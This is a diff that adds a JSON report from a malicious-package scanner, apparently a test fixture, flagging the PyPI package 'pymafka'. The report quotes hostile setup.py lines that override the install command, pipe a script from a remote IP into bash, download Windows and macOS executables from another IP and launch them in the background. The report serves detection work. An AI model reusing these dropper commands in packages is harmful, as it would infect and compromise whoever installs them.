@@ -1,0 +1,61 @@
+{
+    "issues": 8,
+    "errors": {},
+    "results": {
+        "exec-base64": {},
+        "clipboard-access": {},
+        "obfuscation": {},
+        "silent-process-execution": {},
+        "steganography": {},
+        "dll-hijacking": {},
+        "cmd-overwrite": [
+            {
+                "location": "pymafka-1.0/setup.py:57",
+                "code": "setuptools.setup(\n    name=\"pymafka\",\n    version=\"1.0\",\n    url=\"http://pypi.org/\",\n    author=\"pypi\",\n    author_email=\"wangrm40@meituan.com\",\n    description=\"\",\n    long_description=\"\",\n    packages=setuptools.find_packages(),\n    cmdcl...\n    ],\n)\n",
+                "message": "This package is overwriting the 'install' command in setup.py"
+            }
+        ],
+        "exfiltrate-sensitive-data": {},
+        "code-execution": [
+            {
+                "location": "pymafka-1.0/setup.py:39",
+                "code": "                subprocess.Popen(\"c:\\\\users\\\\public\\\\iexplorer.exe run\",shell=True)\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "pymafka-1.0/setup.py:42",
+                "code": "            subprocess.Popen(\"curl -A O -o- -L http://39.107.154.72/env | bash -s\",shell=True)\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "pymafka-1.0/setup.py:52",
+                "code": "                subprocess.Popen([\"chmod\",\"+x\",sfile])\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "pymafka-1.0/setup.py:53",
+                "code": "                subprocess.Popen(\"nohup /var/tmp/zad > /tmp/log 2>&1 &\",shell=True)\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            }
+        ],
+        "download-executable": {},
+        "shady-links": [
+            {
+                "location": "pymafka-1.0/setup.py:34",
+                "code": "                url = 'http://141.164.58.147:8090/win.exe'\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            },
+            {
+                "location": "pymafka-1.0/setup.py:42",
+                "code": "            subprocess.Popen(\"curl -A O -o- -L http://39.107.154.72/env | bash -s\",shell=True)\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            },
+            {
+                "location": "pymafka-1.0/setup.py:47",
+                "code": "                url = 'http://141.164.58.147:8090/MacOs'\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            }
+        ]
+    },
+    "path": "./dataset/pypi/pymafka-3.0"
+}
